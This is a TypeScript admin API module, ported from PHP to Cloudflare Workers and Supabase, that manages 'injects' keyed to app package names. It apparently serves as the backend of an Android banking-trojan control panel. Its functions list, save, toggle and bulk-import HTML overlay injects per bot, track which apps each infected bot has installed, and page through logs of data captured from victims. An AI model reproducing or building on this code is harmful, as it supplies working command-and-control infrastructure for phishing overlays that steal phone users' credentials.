// api/src/admin-api/smarts.ts
// Controlador de Smarts (Injects) para API administrativa
// Adaptado de smarts.class.php e admin.class.php para Cloudflare Workers + Supabase
// Retorna dados JSON (não HTML)

import { SupabaseClient } from '@supabase/supabase-js';
import { apps2array, package_list_to_array } from '../shared/utils';
import { SPECIAL_INJECTS, SPECIAL_STATUSES } from '../shared/constants';

// ----------------------------------------------------------------------
// Tipos auxiliares
// ----------------------------------------------------------------------
export interface SmartItem {
  id: number;
  stype: string;      // 'html' | 'url'
  sgroup: string;
  package: string;
  data: string;
  cap_data: string;
  icon: string | null; // base64
  is_active: boolean;
  logs_count: number;
  has_cap: boolean;
  status_text: string;
}

export interface SmartLogEntry {
  id: number;
  smart_id: number;
  bot_id: string;
  time: string;
  data: string;
  package?: string;
  group?: string;
  type?: string;
}

export interface SmartGrouped {
  group: string;
  items: SmartItem[];
}

export interface CommandResult {
  success: boolean;
  message: string;
  data?: any;
}

// ----------------------------------------------------------------------
// Função auxiliar: incrementa versão dos smarts (config smarts_ver)
// ----------------------------------------------------------------------
async function incrementVersion(supabase: SupabaseClient): Promise<void> {
  const { data: config, error } = await supabase
    .from('config')
    .select('value')
    .eq('name', 'smarts_ver')
    .maybeSingle();

  if (error || !config) {
    await supabase.from('config').insert({
      name: 'smarts_ver',
      value: '0',
      descr: 'Timestamp of last injects update',
      placeholder: '',
    });
    return;
  }

  const newValue = String(Number(config.value || '0') + 1);
  await supabase.from('config').update({ value: newValue }).eq('name', 'smarts_ver');
}

// ----------------------------------------------------------------------
// Função auxiliar: converte bytea (Uint8Array) para base64
// ----------------------------------------------------------------------
function byteaToBase64(bytea: any): string | null {
  if (!bytea) return null;
  try {
    const bytes = new Uint8Array(bytea as ArrayBuffer);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  } catch {
    return null;
  }
}

// ----------------------------------------------------------------------
// Função auxiliar: converte base64 para Uint8Array
// ----------------------------------------------------------------------
function base64ToUint8Array(base64: string): Uint8Array {
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

// ----------------------------------------------------------------------
// Função auxiliar: formata o status do inject (simplificado, retorna texto puro)
// ----------------------------------------------------------------------
export function getSmartStatusText(
  pkg: string,
  isActive: boolean,
  hasCap: boolean,
  hasLogs: boolean,
  botApps?: string[],
): string {
  if (SPECIAL_STATUSES[pkg]) return SPECIAL_STATUSES[pkg];

  const uninstalled = botApps && botApps.length > 0 && !botApps.includes(pkg);

  if (isActive) {
    return uninstalled ? 'Uninstalled' : 'Active';
  }

  if (hasLogs) return 'Has Logs';
  if (uninstalled) return 'Deactivated; Uninstalled';
  if (hasCap) return 'Deactivated; Shows Cap';
  return 'Deactivated';
}

// ----------------------------------------------------------------------
// Função: listSmarts
// ----------------------------------------------------------------------
export async function listSmarts(
  supabase: SupabaseClient,
  filters?: { group?: string; package?: string; botId?: string; onlyActive?: boolean },
): Promise<SmartGrouped[]> {
  try {
    let query = supabase
      .from('smarts')
      .select('*')
      .order('sgroup')
      .order('package');

    if (filters?.group) query = query.eq('sgroup', filters.group);
    if (filters?.package) query = query.like('package', `%${filters.package}%`);
    if (filters?.onlyActive) query = query.eq('is_active', true);

    if (filters?.botId) {
      const { data: bot } = await supabase
        .from('bots')
        .select('apps')
        .eq('bot_id', filters.botId)
        .maybeSingle();

      if (bot?.apps) {
        const appsArr = apps2array(bot.apps);
        if (appsArr.length > 0) {
          query = query.in('package', appsArr);
        }
      }
    }

    const { data: smarts, error } = await query;
    if (error) throw error;
    if (!smarts || smarts.length === 0) return [];

    const { data: logsCounts, error: logsError } = await supabase
      .from('smarts_data')
      .select('smart_id, count')
      .in('smart_id', smarts.map((s) => s.id));

    if (logsError) throw logsError;

    const logsMap = new Map<number, number>();
    for (const row of logsCounts || []) {
      logsMap.set(row.smart_id, Number(row.count));
    }

    const items: SmartItem[] = smarts.map((s) => {
      const logs_count = logsMap.get(s.id) || 0;
      return {
        id: s.id,
        stype: s.stype,
        sgroup: s.sgroup,
        package: s.package,
        data: s.data,
        cap_data: s.cap_data,
        icon: byteaToBase64(s.icon),
        is_active: Boolean(s.is_active),
        logs_count,
        has_cap: Boolean(s.cap_data && s.cap_data !== ''),
        status_text: getSmartStatusText(s.package, Boolean(s.is_active), Boolean(s.cap_data), logs_count > 0),
      };
    });

    const groupedMap = new Map<string, SmartItem[]>();
    for (const item of items) {
      if (!groupedMap.has(item.sgroup)) groupedMap.set(item.sgroup, []);
      groupedMap.get(item.sgroup)!.push(item);
    }

    return Array.from(groupedMap.entries()).map(([group, items]) => ({ group, items }));
  } catch (err) {
    console.error('listSmarts error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// Função: getSmartDetail
// ----------------------------------------------------------------------
export async function getSmartDetail(
  supabase: SupabaseClient,
  id: number,
): Promise<SmartItem | null> {
  try {
    const { data: smart, error } = await supabase
      .from('smarts')
      .select('*')
      .eq('id', id)
      .maybeSingle();

    if (error) throw error;
    if (!smart) return null;

    const { count: logsCount, error: logsError } = await supabase
      .from('smarts_data')
      .select('id', { count: 'exact', head: true })
      .eq('smart_id', id);

    if (logsError) throw logsError;

    return {
      id: smart.id,
      stype: smart.stype,
      sgroup: smart.sgroup,
      package: smart.package,
      data: smart.data,
      cap_data: smart.cap_data,
      icon: byteaToBase64(smart.icon),
      is_active: Boolean(smart.is_active),
      logs_count: logsCount || 0,
      has_cap: Boolean(smart.cap_data && smart.cap_data !== ''),
      status_text: getSmartStatusText(smart.package, Boolean(smart.is_active), Boolean(smart.cap_data), (logsCount || 0) > 0),
    };
  } catch (err) {
    console.error('getSmartDetail error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// Função: saveSmart
// ----------------------------------------------------------------------
export async function saveSmart(
  supabase: SupabaseClient,
  formData: FormData,
): Promise<CommandResult> {
  try {
    const id = formData.get('id') ? Number(formData.get('id')) : null;
    const stype = formData.get('stype') as string;
    const group = (formData.get('group') as string)?.trim().toLowerCase() || '';
    const pkg = (formData.get('package') as string)?.trim() || '';
    const capData = (formData.get('cap_data') as string) || '';
    const isActive = formData.get('is_active') === 'true' || formData.get('is_active') === '1';

    if (!pkg || !/^[a-zA-Z0-9.]{3,128}$/.test(pkg)) {
      return { success: false, message: 'Package name is incorrect' };
    }

    let dataField = '';
    if (stype === 'html') {
      dataField = (formData.get('data') as string) || (formData.get('html') as string) || '';
      if (dataField.length < 3) {
        return { success: false, message: 'HTML file is too small' };
      }
    } else if (stype === 'url') {
      const url = (formData.get('url') as string)?.trim() || '';
      const closeRule = (formData.get('close_rule') as string)?.trim() || '';
      if (!url || !closeRule) {
        return { success: false, message: 'URL and Close Rule are required' };
      }
      dataField = `${url}:CLOSE_ON:${closeRule}`;
    } else {
      return { success: false, message: 'Invalid stype' };
    }

    // Processar ícone – pode ser Blob/File ou string base64
    let iconBytes: Uint8Array | null = null;
    const iconValue = formData.get('icon');

    if (iconValue !== null) {
      if (typeof iconValue === 'string') {
        // Se for base64 string
        if (iconValue.startsWith('data:image/png;base64,')) {
          const base64 = iconValue.split(',')[1];
          iconBytes = base64ToUint8Array(base64);
        } else if (iconValue.length > 0) {
          // Assume base64 puro
          iconBytes = base64ToUint8Array(iconValue);
        }
      } else if (iconValue !== null && typeof iconValue === 'object') {
        const blob = iconValue as Blob;
        if (typeof blob.arrayBuffer === 'function') {
          const arrayBuffer = await blob.arrayBuffer();
          iconBytes = new Uint8Array(arrayBuffer);
        }
      }
    }

    // Verificar unicidade do package
    const { data: existing } = await supabase
      .from('smarts')
      .select('id')
      .eq('package', pkg)
      .maybeSingle();

    if (existing && existing.id !== id) {
      return { success: false, message: `Inject with package ${pkg} already exists` };
    }

    const record: Record<string, any> = {
      stype,
      sgroup: group || 'custom',
      package: pkg,
      data: dataField,
      cap_data: capData,
      is_active: isActive,
    };
    if (iconBytes) {
      record.icon = iconBytes;
    }

    if (id) {
      const { error: updateError } = await supabase
        .from('smarts')
        .update(record)
        .eq('id', id);
      if (updateError) throw updateError;
    } else {
      const { error: insertError } = await supabase.from('smarts').insert(record);
      if (insertError) throw insertError;
    }

    await incrementVersion(supabase);
    return { success: true, message: id ? 'Inject updated' : 'Inject added' };
  } catch (err) {
    console.error('saveSmart error:', err);
    return { success: false, message: 'Error saving inject', data: err };
  }
}

// ----------------------------------------------------------------------
// Função: deleteSmart
// ----------------------------------------------------------------------
export async function deleteSmart(
  supabase: SupabaseClient,
  id: number,
): Promise<CommandResult> {
  try {
    await supabase.from('smarts_data').delete().eq('smart_id', id);
    await supabase.from('smarts_bots').delete().eq('smart_id', id);
    const { error } = await supabase.from('smarts').delete().eq('id', id);
    if (error) throw error;

    await incrementVersion(supabase);
    return { success: true, message: 'Inject deleted' };
  } catch (err) {
    console.error('deleteSmart error:', err);
    return { success: false, message: 'Error deleting inject' };
  }
}

// ----------------------------------------------------------------------
// Função: toggleSmart
// ----------------------------------------------------------------------
export async function toggleSmart(
  supabase: SupabaseClient,
  id: number,
  active: boolean,
): Promise<CommandResult> {
  try {
    const { error: updateSmart } = await supabase
      .from('smarts')
      .update({ is_active: active })
      .eq('id', id);
    if (updateSmart) throw updateSmart;

    const { error: updateBots } = await supabase
      .from('smarts_bots')
      .update({ is_active: active })
      .eq('smart_id', id);
    if (updateBots) throw updateBots;

    await incrementVersion(supabase);
    return { success: true, message: active ? 'Inject activated' : 'Inject deactivated' };
  } catch (err) {
    console.error('toggleSmart error:', err);
    return { success: false, message: 'Error toggling inject' };
  }
}

// ----------------------------------------------------------------------
// Função: toggleAll
// ----------------------------------------------------------------------
export async function toggleAll(
  supabase: SupabaseClient,
  active: boolean,
): Promise<CommandResult> {
  try {
    const { error: updateSmarts } = await supabase
      .from('smarts')
      .update({ is_active: active })
      .neq('sgroup', 'specials');
    if (updateSmarts) throw updateSmarts;

    const { data: specials } = await supabase
      .from('smarts')
      .select('id')
      .eq('sgroup', 'specials');
    const specialIds = specials?.map((s) => s.id) || [];

    let query = supabase
      .from('smarts_bots')
      .update({ is_active: active });

    if (specialIds.length > 0) {
      query = query.not('smart_id', 'in', `(${specialIds.join(',')})`);
    }

    const { error: updateBots } = await query;
    if (updateBots) throw updateBots;

    await incrementVersion(supabase);
    return { success: true, message: active ? 'All injects activated' : 'All injects deactivated' };
  } catch (err) {
    console.error('toggleAll error:', err);
    return { success: false, message: 'Error toggling all injects' };
  }
}

// ----------------------------------------------------------------------
// Função: getSmartLogs
// ----------------------------------------------------------------------
export async function getSmartLogs(
  supabase: SupabaseClient,
  filters?: {
    smartId?: number;
    botId?: string;
    page?: number;
    rows?: number;
  },
): Promise<{ logs: SmartLogEntry[]; total: number }> {
  try {
    const page = filters?.page || 0;
    const rows = filters?.rows || 20;
    const from = page * rows;
    const to = from + rows - 1;

    let query = supabase
      .from('smarts_data')
      .select('id, smart_id, bot_id, time, data', { count: 'exact' });

    if (filters?.smartId) query = query.eq('smart_id', filters.smartId);
    if (filters?.botId) query = query.eq('bot_id', filters.botId);

    query = query.order('id', { ascending: false }).range(from, to);

    const { data, error, count } = await query;
    if (error) throw error;

    return {
      logs: (data as SmartLogEntry[]) || [],
      total: count || 0,
    };
  } catch (err) {
    console.error('getSmartLogs error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// Função: deleteSmartLogs
// ----------------------------------------------------------------------
export async function deleteSmartLogs(
  supabase: SupabaseClient,
  ids: number[],
): Promise<CommandResult> {
  try {
    if (!ids || ids.length === 0) {
      return { success: false, message: 'No log IDs provided' };
    }

    const { error } = await supabase.from('smarts_data').delete().in('id', ids);
    if (error) throw error;

    return { success: true, message: `${ids.length} record(s) removed` };
  } catch (err) {
    console.error('deleteSmartLogs error:', err);
    return { success: false, message: 'Error deleting logs' };
  }
}

// ----------------------------------------------------------------------
// Função: importZip (simplificada)
// ----------------------------------------------------------------------
export async function importZip(
  supabase: SupabaseClient,
  formData: FormData,
): Promise<CommandResult> {
  try {
    const useFolders = formData.get('use_folders') === 'true';
    const fixedGroupName = (formData.get('group') as string)?.replace(/[^a-zA-Z0-9]/g, '') || '';

    const htmlFiles: File[] = [];
    const pngFiles: Map<string, File> = new Map();

    formData.forEach((value, key) => {
      // Ignorar valores que não sejam Blob
      if (value !== null && typeof value === 'object' && typeof (value as Blob).arrayBuffer === 'function') {
        const file = value as File;
        const name = file.name.toLowerCase();
        if (name.endsWith('.html') || name.endsWith('.htm')) {
          htmlFiles.push(file);
        } else if (name.endsWith('.png')) {
          pngFiles.set(file.name, file);
        }
      }
    });

    if (htmlFiles.length === 0) {
      return { success: false, message: 'No HTML files found in import' };
    }

    let importedCount = 0;

    for (const file of htmlFiles) {
      const fileName = file.name;
      const pkg = fileName.replace(/\.(html|htm)$/i, '').toLowerCase();
      const group = useFolders
        ? fileName.split('/')[0]
        : fixedGroupName || 'custom';

      const content = await file.text();
      if (content.trim().length < 3) continue;

      let iconBytes: Uint8Array | null = null;
      const iconFile = pngFiles.get(`${pkg}.png`);
      if (iconFile) {
        iconBytes = new Uint8Array(await iconFile.arrayBuffer());
      }

      const record: Record<string, any> = {
        stype: 'html',
        sgroup: group,
        package: pkg,
        data: content,
        cap_data: '',
        is_active: true,
      };
      if (iconBytes) record.icon = iconBytes;

      const { error } = await supabase
        .from('smarts')
        .upsert(record, { onConflict: 'package' });

      if (!error) importedCount++;
    }

    if (importedCount > 0) {
      await incrementVersion(supabase);
      return { success: true, message: `${importedCount} inject(s) imported successfully` };
    } else {
      return { success: false, message: 'No injects could be imported' };
    }
  } catch (err) {
    console.error('importZip error:', err);
    return { success: false, message: 'Error importing injects' };
  }
}